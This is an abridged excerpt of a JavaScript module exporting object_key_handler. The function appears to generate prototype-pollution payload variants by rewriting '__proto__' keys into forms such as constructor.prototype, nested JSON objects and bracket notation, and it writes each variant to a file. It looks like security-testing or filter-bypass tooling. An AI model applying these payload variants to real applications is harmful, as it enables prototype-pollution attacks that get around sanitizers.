...
function object_key_handler(filePath,code,value,type="object_key"){
  ...
  // 1st and 2nd if are the ones actually needed, rest are just copied from string_literal_handler, just in case 
  if(value == "__proto__"){

    var code1 = ast_replacer("object_key","__proto__","constructor.prototype",code)
    ...
    var code1 = ast_replacer("object_key",value,"constructor.prototype." + some_string, code)
    createFile(filePath,code1)
    variant_caller([code1,code],filePath)
    ...
    var code1 = ast_replacer("object_key",value,`{"constructor": {"prototype": {"${some_string}":"${some_other_string}"}}}`, code)
    var code2 = ast_replacer("object_key",value,`{"constructor.prototype": {"${some_string}":"${some_other_string}"}}`, code)
    createFile(filePath,code1)
    ...
    var code1 = ast_replacer("object_key",value,`{"${some_string}": {"constructor": {"prototype": {"${some_other_string}":"${another_string}"}}}}`, code)
    var code2 = ast_replacer("object_key",value,`{"${some_string}": {"constructor.prototype": {"${some_other_string}":"${another_string}"}}}`, code)
    createFile(filePath,code1)
    createFile(filePath,code2)
    ...
    var code1 = ast_replacer("object_key",value,`constructor.prototype[${some_string}]`, code)
    var code2 = ast_replacer("object_key",value,`constructor[prototype][${some_string}]`, code)
    createFile(filePath,code1)
    createFile(filePath,code2)
    ...
    var code1 = ast_replacer("object_key",value,`[constructor.prototype]\n${some_string}=${some_other_string}`, code)
    var code2 = ast_replacer("object_key",value,`[constructor][prototype]\n${some_string}=${some_other_string}`, code)
    createFile(filePath,code1)
    createFile(filePath,code2)
    ...
    var code1 = ast_replacer("object_key",value,`${some_string}.constructor.prototype.${some_other_string}`, code)
    createFile(filePath,code1)
...
module.exports = object_key_handler